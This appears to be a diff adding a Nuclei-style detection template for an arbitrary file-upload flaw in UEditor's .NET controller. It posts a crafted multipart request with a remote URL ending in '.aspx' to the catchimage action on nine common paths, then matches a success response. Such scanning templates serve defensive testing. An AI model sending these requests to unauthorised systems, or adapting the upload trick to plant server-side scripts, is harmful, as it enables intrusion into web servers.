@@ -1,0 +1,39 @@
+id: ueditor-net-arbitrary-file-upload
+info:
+  name: UEditor .NET Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+http:
+  - method: POST
+    path:
+      - "/z-blog/zb_users/plugin/ueditor/net/controller.ashx?action=catchimage"
+      - "/plugin/ueditor/net/controller.ashx?action=catchimage"
+      - "/Content/plugins/ueditor/net/controller.ashx?action=catchimage"
+      - "/Utility/UEditor/net?action=catchimage"
+      - "/Utility/UEditor?action=catchimage"
+      - "/scripts/ueditor/net/controller.ashx?action=catchimage"
+      - "/js/ueditor/net/controller.ashx?action=catchimage"
+      - "/Static/ueditor/net/controller.ashx?action=catchimage"
+      - "/Scripts/Ueditor/net/controller.ashx?action=catchimage"
+    headers:
+      Accept: application/json,image/png,text/javascript, /; q=0.01
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAlM7AOTh0AFhjpae
+    body: |-
+      ------WebKitFormBoundaryAlM7AOTh0AFhjpae
+      Content-Disposition: form-data; name="source[]"
+
+      http://www.baidu.com/img/sug_bd.png?.aspx
+      ------WebKitFormBoundaryAlM7AOTh0AFhjpae--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"SUCCESS\""
+          - "\"http://www.baidu.com/img/sug_bd.png"
+          - "\"source\""
+          - "\"list\""
+        part: body
